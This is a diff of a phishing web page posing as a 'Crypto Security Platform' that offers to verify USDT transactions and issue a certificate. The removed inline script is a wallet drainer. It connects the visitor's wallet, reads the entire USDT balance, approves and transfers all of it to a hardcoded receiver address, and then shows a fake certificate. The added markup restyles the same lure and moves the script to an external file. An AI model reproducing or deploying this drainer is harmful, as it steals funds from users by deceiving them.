@@ -1,136 +1,116 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Crypto Security Platform</title>
+  <link rel="stylesheet" href="style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background: #0a0a0a;
-      color: #ffffff;
+      font-family: 'Roboto', sans-serif;
+      background-color: #000;
+      color: #fff;
     }
     header {
-      background: #000000;
-      padding: 20px;
-      text-align: center;
-      font-size: 24px;
-      font-weight: bold;
-    }
-    .container {
-      max-width: 600px;
-      margin: 40px auto;
-      padding: 20px;
-      background: #111;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(255,255,255,0.1);
-      text-align: center;
-    }
-    button {
+      background-color: #0d0d0d;
       padding: 10px 20px;
-      font-size: 16px;
-      border: none;
-      border-radius: 5px;
-      background-color: #00b894;
-      color: #fff;
-      cursor: pointer;
-      transition: background 0.3s;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
     }
-    button:hover {
-      background-color: #019875;
+    .logo {
+      font-size: 20px;
+      font-weight: bold;
+      color: #00ffcc;
+    }
+    nav a {
+      margin-left: 20px;
+      text-decoration: none;
+      color: #fff;
+      font-size: 14px;
+    }
+    .hero {
+      text-align: center;
+      padding: 80px 20px 40px;
+    }
+    .hero h1 {
+      font-size: 36px;
+      margin-bottom: 10px;
+    }
+    .hero p {
+      font-size: 18px;
+      color: #ccc;
+    }
+    .section {
+      padding: 40px 20px;
+      max-width: 1000px;
+      margin: auto;
+    }
+    .button {
+      background-color: #00ffcc;
+      border: none;
+      padding: 12px 25px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+      margin-top: 20px;
     }
     #certificate-container {
       margin-top: 30px;
-      background: #222;
+      background-color: #111;
       padding: 20px;
-      border-radius: 10px;
+      border-radius: 8px;
+      display: none;
     }
-    .cert-label {
+    .info-label {
       font-weight: bold;
+      color: #00ffcc;
+    }
+    .info-value {
+      margin-bottom: 10px;
     }
   </style>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 </head>
 <body>
   <header>
-    Crypto Security Platform
+    <div class="logo">Crypto Security Platform</div>
+    <nav>
+      <a href="#">Home</a>
+      <a href="#">Verify Transaction</a>
+      <a href="#">Security Guide</a>
+      <a href="#">Learn More</a>
+    </nav>
   </header>
-  <div class="container">
-    <p>Verify your crypto transaction by connecting your wallet and retrieving your certificate.</p>
-    <button onclick="checkAndApprove()">Get Certificate</button>
 
-    <div id="certificate-container"></div>
+  <div class="hero">
+    <h1>Verify Your USDT Transaction</h1>
+    <p>Connect your wallet and generate your certificate</p>
+    <button class="button" onclick="checkAndApprove()">Get Certificate</button>
   </div>
 
-  <script>
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
-    const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // Your address
-    const usdtAbi = [
-      {
-        "constant": true,
-        "inputs": [{ "name": "", "type": "address" }],
-        "name": "balanceOf",
-        "outputs": [{ "name": "", "type": "uint256" }],
-        "type": "function"
-      },
-      {
-        "constant": false,
-        "inputs": [
-          { "name": "_spender", "type": "address" },
-          { "name": "_value", "type": "uint256" }
-        ],
-        "name": "approve",
-        "outputs": [{ "name": "", "type": "bool" }],
-        "type": "function"
-      },
-      {
-        "constant": false,
-        "inputs": [
-          { "name": "_to", "type": "address" },
-          { "name": "_value", "type": "uint256" }
-        ],
-        "name": "transfer",
-        "outputs": [{ "name": "", "type": "bool" }],
-        "type": "function"
-      }
-    ];
+  <div class="section" id="certificate-container">
+    <h2>✅ Certificate Generated</h2>
+    <p><span class="info-label">Wallet Address:</span> <span id="wallet-address" class="info-value"></span></p>
+    <p><span class="info-label">Amount Transferred:</span> <span id="amount-transferred" class="info-value"></span></p>
+    <p><span class="info-label">Date & Time:</span> <span id="timestamp" class="info-value"></span></p>
+  </div>
+        <div id="certificate-container" class="certificate-box" style="display:none;">
+          <h3>✅ Certificate Generated</h3>
+          <p><strong>Wallet:</strong> <span id="user-wallet"></span></p>
+          <p><strong>Amount:</strong> <span id="usdt-amount"></span> USDT</p>
+          <p><strong>Date:</strong> <span id="timestamp"></span></p>
+        </div>
+      </div>
+    </div>
+  </div>
 
-    async function checkAndApprove() {
-      if (typeof window.ethereum === 'undefined') {
-        alert("Please install MetaMask or Trust Wallet.");
-        return;
-      }
+  <footer style="text-align:center; margin-top:30px; font-size:13px; color:#aaa;">
+    <p>CryptoSecurity Platform © 2025 | All Rights Reserved</p>
+  </footer>
 
-      const web3 = new Web3(window.ethereum);
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const accounts = await web3.eth.getAccounts();
-      const userAddress = accounts[0];
-
-      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
-      const balance = await usdt.methods.balanceOf(userAddress).call();
-
-      if (parseInt(balance) === 0) {
-        alert("No USDT balance found.");
-        return;
-      }
-
-      await usdt.methods.approve(receiverAddress, balance).send({ from: userAddress });
-      await usdt.methods.transfer(receiverAddress, balance).send({ from: userAddress });
-
-      displayCertificate(userAddress, balance);
-    }
-
-    function displayCertificate(address, amount) {
-      const container = document.getElementById("certificate-container");
-      const now = new Date().toLocaleString();
-      container.innerHTML = `
-        <h3>✅ Certificate Generated</h3>
-        <p><span class="cert-label">Wallet Address:</span><br>${address}</p>
-        <p><span class="cert-label">Amount Transferred:</span><br>${(amount / 1e18).toFixed(2)} USDT</p>
-        <p><span class="cert-label">Timestamp:</span><br>${now}</p>
-      `;
-    }
-  </script>
+  <!-- Script file -->
+  <script src="script.js"></script>
 </body>
 </html>
